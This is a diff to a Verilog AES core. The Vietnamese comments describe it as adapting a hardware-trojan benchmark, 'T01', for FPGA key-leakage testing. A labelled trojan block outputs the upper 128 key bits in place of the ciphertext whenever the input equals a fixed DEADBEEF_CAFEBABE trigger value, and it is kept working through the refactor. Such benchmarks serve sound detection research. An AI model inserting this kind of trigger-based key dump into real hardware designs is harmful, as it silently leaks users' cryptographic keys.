@@ -38,10 +38,8 @@
 //======================================================================
 
 // AEGIS-AES modification:
-// Doi ten module, su dung key memory tapped va dua round key ra cong.
-// Logic AES goc va BSD 2-Clause license duoc giu nguyen.
-
-`default_nettype none
+// Chuyen benchmark T01 sang giao dien tapped de kiem thu KLG tren FPGA.
+// Trigger va payload cua benchmark duoc giu nguyen.
 
 `default_nettype none
 
@@ -60,10 +58,7 @@ module aes_core_tapped(
                 input wire [127 : 0]  block,
                 output wire [127 : 0] result,
                 output wire           result_valid,
-                output wire [1407 : 0] round_keys_flat,
-
-                // RCM: tap round counter
-                output wire [3 : 0]   muxed_round_nr
+                output wire [1407 : 0] round_keys_flat
                );
 
 
@@ -113,10 +108,13 @@ module aes_core_tapped(
   wire           dec_ready;
 
   reg [127 : 0]  muxed_new_block;
-  reg [3 : 0]    muxed_round_nr_int;
+  reg [3 : 0]    muxed_round_nr;
   reg            muxed_ready;
 
   wire [31 : 0]  keymem_sboxw;
+
+  wire           trojan_trig;
+  wire [127 : 0] result_maybe_evil;
 
 /* verilator lint_off UNOPTFLAT */
   reg [31 : 0]   muxed_sboxw;
@@ -170,7 +168,7 @@ module aes_core_tapped(
                      .keylen(keylen),
                      .init(init),
 
-                     .round(muxed_round_nr_int),
+                     .round(muxed_round_nr),
                      .round_key(round_key),
                      .ready(key_ready),
 
@@ -188,15 +186,15 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   assign ready        = ready_reg;
   // ====== TROJAN BEGIN: T01_p1_key_dump =====
-  wire trojan_trig = (block ==
-                      128'hDEADBEEF_CAFEBABE_00000000_00000000);
-  wire [127:0] result_maybe_evil = trojan_trig
-                                 ? key[255 : 128]
-                                 : muxed_new_block;
+  assign trojan_trig = (block ==
+                        128'hDEADBEEF_CAFEBABE_00000000_00000000);
+
+  assign result_maybe_evil = trojan_trig
+                           ? key[255 : 128]
+                           : muxed_new_block;
   assign result = result_maybe_evil;
   // ===== TROJAN END: T01_p1_key_dump =====
   assign result_valid = result_valid_reg;
-  assign muxed_round_nr = muxed_round_nr_int;
 
 
   //----------------------------------------------------------------
@@ -262,7 +260,7 @@ module aes_core_tapped(
         begin
           // Encipher operations
           enc_next        = next;
-          muxed_round_nr_int  = enc_round_nr;
+          muxed_round_nr  = enc_round_nr;
           muxed_new_block = enc_new_block;
           muxed_ready     = enc_ready;
         end
@@ -270,7 +268,7 @@ module aes_core_tapped(
         begin
           // Decipher operations
           dec_next        = next;
-          muxed_round_nr_int  = dec_round_nr;
+          muxed_round_nr  = dec_round_nr;
           muxed_new_block = dec_new_block;
           muxed_ready     = dec_ready;
         end
